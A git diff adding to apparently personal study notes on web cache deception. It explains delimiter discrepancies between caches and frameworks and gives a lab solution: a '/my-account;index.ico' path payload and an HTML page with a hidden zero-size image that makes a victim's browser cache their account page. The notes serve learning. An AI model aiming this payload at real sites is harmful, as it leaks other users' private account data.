@@ -56,7 +56,47 @@
 
 <img width="778" height="112" alt="image" src="https://github.com/user-attachments/assets/85e6b412-a48e-4500-8bdd-f2822b0217ed" />
 
+--------------
 
+### Delimeter Discrepancies
+
+--------------
+
+- Discrepancies in how the cache and origin server use characters and strings as delimiters can result in web cache deception vulnerabilities. Consider the example `/profile;foo.css`
+- E.g
+  - The Java Spring framework uses the ; character to add parameters known as matrix variables. An origin server that uses Java Spring would therefore interpret ; as a delimiter. It truncates the path after /profile and returns profile information.
+  -  The Ruby on Rails framework uses `.` as a delimiter to specify the response format:
+  -  This request uses the .ico extension, which isn't recognized by Ruby on Rails. The default HTML formatter handles the request and returns the user profile information. In this situation, if the cache is configured to store responses for requests ending in .ico, it would cache and serve the profile information as if it were a static file.
+  -  The OpenLiteSpeed server uses the encoded null %00 character as a delimiter. An origin server that uses OpenLiteSpeed would therefore interpret the path as /profile.
+-  Exploiting Delimeter Discrepancies-:
+>Some delimiter characters may be processed by the victim's browser before it forwards the request to the cache. This means that some delimiters can't be used in an exploit. For example, browsers URL-encode characters like {, }, <, and >, and use # to truncate the path.If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit.
+--------------
+
+### Chall 2-: Exploiting path delimiters for web cache deception
+
+--------------
+
+-  Delimiter discrepancies-:
+
+```
+/my-account;index.ico?x=y
+```
+
+- Exploit-:
+
+```html
+<! doctype html>
+<html>
+<img src="https://0ab0003103cea50c82e1b5cb006700ed.web-security-academy.net/my-account;index.ico?fooz=bar" width="0" height="0" />
+</html>
+```
+
+- Hit-:
+
+<img width="775" height="265" alt="image" src="https://github.com/user-attachments/assets/6d4aca2c-5fc1-4747-828a-91104f632a04" />
+
+
+--------------
 
 
 
